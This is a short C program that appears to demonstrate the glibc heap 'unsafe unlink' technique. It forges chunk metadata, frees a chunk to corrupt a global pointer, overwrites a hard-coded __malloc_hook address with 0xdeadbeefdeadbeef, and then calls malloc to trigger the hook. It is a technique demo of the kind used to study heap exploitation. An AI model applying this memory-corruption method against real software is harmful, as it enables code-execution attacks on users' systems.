#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <string.h>
#define __malloc_hook 0x7ffff7dd1b10

void init() {
	setvbuf(stdout, 0, 2, 0);
	setvbuf(stdin, 0, 1, 0);
	setvbuf(stderr, 0, 1, 0);
}

long long list[0x20] = {0};

int main(){	
	long long target_addr = __malloc_hook;
	long long target_value = 0xdeadbeefdeadbeef;
	char buf[0x20] = {0};
	char buf2[0x8] = {0};
	long long *p,*q;
	init();
	// init two chunks
	p = malloc(0x28);
	q = malloc(0xf8);
	list[0] = p;
	// fake prev_size,size,fd,bk
	// and next chunk's prev_size, next chunk's size
	p[0] = 0;
	p[1] = 0x21; // not necessary
	p[2] = (char *)&list[0] - 0x18;
	p[3] = (char *)&list[0] - 0x10;
	p[4] = 0x20;
	p[5] = 0x100;
	sleep(0);
	// free q to trigger unlink
	free(q);
	sleep(0);
	// list[0] = &list[0] - 0x18
	// set list[0] = target_addr
	strcpy(buf,"aaaaaaaabbbbbbbbcccccccc");
	sprintf(buf2,"%s",(char *)&target_addr);
	strcat(buf,buf2);
	strcpy(list[0],buf);
	sleep(0);
	// write target_addr = target_value
	sprintf(buf2,"%s",(char *)&target_value);
	strcpy(list[0],buf2);
	sleep(0);
	// malloc to trigger 0xdeadbeefdeadbeef
	malloc(0);
}
